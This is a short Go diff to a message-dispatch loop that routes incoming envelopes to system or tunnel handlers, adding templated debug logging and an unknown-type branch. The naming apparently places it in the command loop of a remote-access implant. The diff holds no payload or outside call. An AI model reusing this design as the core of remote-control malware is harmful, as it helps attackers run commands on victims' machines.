@@ -61,15 +61,24 @@ func mainLoop(connection *transports.Connection) {
 
 	for envelope := range connection.Recv {
 		if handler, ok := sysHandlers[envelope.Type]; ok {
+			// {{if .Debug}}
+			log.Printf("[recv] sysHandler %d", envelope.Type)
+			// {{end}}
 			go handler(envelope.Data, func(data []byte, err error) {
 				connection.Send <- &pb.Envelope{
 					ID:   envelope.ID,
 					Data: data,
 				}
 			})
-		}
-		if handler, ok := tunHandlers[envelope.Type]; ok {
+		} else if handler, ok := tunHandlers[envelope.Type]; ok {
+			// {{if .Debug}}
+			log.Printf("[recv] tunHandler %d", envelope.Type)
+			// {{end}}
 			go handler(envelope.Data, connection)
+		} else {
+			// {{if .Debug}}
+			log.Printf("[recv] unknown envelope type %d", envelope.Type)
+			// {{end}}
 		}
 	}
 }
